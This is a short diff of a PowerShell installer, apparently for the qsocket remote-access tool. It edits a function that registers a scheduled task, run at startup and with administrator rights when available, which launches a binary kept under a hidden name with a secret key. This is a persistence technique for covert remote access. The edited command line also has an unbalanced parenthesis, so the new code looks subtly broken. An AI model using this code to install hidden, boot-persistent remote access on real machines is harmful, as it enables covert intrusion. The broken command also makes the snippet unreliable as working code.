@@ -109,9 +109,9 @@ function Download-Qsocket-Util($path)
 function Create-Sceduled-Task($path, $secret)
 {
     Print-Debug "Creating scheduled task..."
-    Print-Debug "Task command: cmd.exe /c (tasklist /FI 'WINDOWTITLE eq $secret'|findstr $QS_SCHEDULED_TASK_NAME) || $path\$QS_BIN_HIDDEN_NAME -liqs $secret"
+    Print-Debug "Task command: cmd.exe /c ($path\$QS_BIN_HIDDEN_NAME -liqs $secret"
     try {
-        $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c (tasklist /FI 'WINDOWTITLE eq $secret'|findstr $QS_SCHEDULED_TASK_NAME) || $path\$QS_BIN_HIDDEN_NAME -liqs $secret"
+        $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c ($path\$QS_BIN_HIDDEN_NAME -liqs $secret"
         $T = New-ScheduledTaskTrigger -AtStartup
         if(Is-Administrator){
             $P = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
